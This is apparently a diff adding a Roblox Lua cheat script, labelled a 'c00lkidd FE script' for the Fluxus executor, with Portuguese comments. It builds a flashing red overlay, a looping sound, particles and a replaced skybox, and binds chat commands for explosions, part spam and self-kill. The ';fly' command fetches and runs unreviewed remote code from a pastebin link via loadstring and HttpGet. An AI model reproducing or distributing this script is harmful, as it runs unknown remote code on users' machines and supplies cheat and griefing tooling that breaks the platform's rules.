@@ -1,0 +1,79 @@
+-- c00lkidd FE Script público por Nickgames (funciona em Fluxus)
+
+local player = game.Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+
+-- GUI c00lkidd
+local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
+gui.Name = "c00lkiddGUI"
+
+local frame = Instance.new("Frame", gui)
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+
+local label = Instance.new("TextLabel", frame)
+label.Size = UDim2.new(1, 0, 1, 0)
+label.Text = "c00lkidd"
+label.TextScaled = true
+label.Font = Enum.Font.Arcade
+label.TextColor3 = Color3.fromRGB(255, 255, 0)
+label.BackgroundTransparency = 1
+
+spawn(function()
+	while true do
+		label.Visible = not label.Visible
+		wait(0.3)
+	end
+end)
+
+-- Som de glitch
+local sound = Instance.new("Sound", player:WaitForChild("PlayerGui"))
+sound.SoundId = "rbxassetid://138186576"
+sound.Volume = 1
+sound.Looped = true
+sound:Play()
+
+-- Partículas no corpo
+local emitter = Instance.new("ParticleEmitter", char:WaitForChild("HumanoidRootPart"))
+emitter.Texture = "rbxassetid://243098098"
+emitter.Rate = 30
+emitter.Lifetime = NumberRange.new(0.5)
+emitter.Speed = NumberRange.new(2,5)
+emitter.Color = ColorSequence.new(Color3.fromRGB(255,0,0))
+
+-- Skybox c00lkidd
+local sky = Instance.new("Sky", game.Lighting)
+sky.SkyboxBk = "rbxassetid://445890188"
+sky.SkyboxDn = "rbxassetid://445890188"
+sky.SkyboxFt = "rbxassetid://445890188"
+sky.SkyboxLf = "rbxassetid://445890188"
+sky.SkyboxRt = "rbxassetid://445890188"
+sky.SkyboxUp = "rbxassetid://445890188"
+
+-- Chat comandos
+game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
+	local cmd = msg:lower()
+	if cmd == ";fly" then
+		loadstring(game:HttpGet("https://pastebin.com/raw/U27yQRxS"))()
+	elseif cmd == ";kill" then
+		if char:FindFirstChild("Humanoid") then
+			char.Humanoid.Health = 0
+		end
+	elseif cmd == ";explode" then
+		local exp = Instance.new("Explosion")
+		exp.Position = char.HumanoidRootPart.Position
+		exp.BlastRadius = 10
+		exp.BlastPressure = 50000
+		exp.Parent = workspace
+	elseif cmd == ";spam" then
+		for i = 1, 50 do
+			local part = Instance.new("Part", workspace)
+			part.Size = Vector3.new(10, 10, 1)
+			part.Anchored = true
+			part.Position = char.HumanoidRootPart.Position + Vector3.new(math.random(-50,50), math.random(5,50), math.random(-50,50))
+			local decal = Instance.new("Decal", part)
+			decal.Texture = "rbxassetid://77035832" -- imagem c00lkidd
+			decal.Face = Enum.NormalId.Front
+		end
+	end
+end)
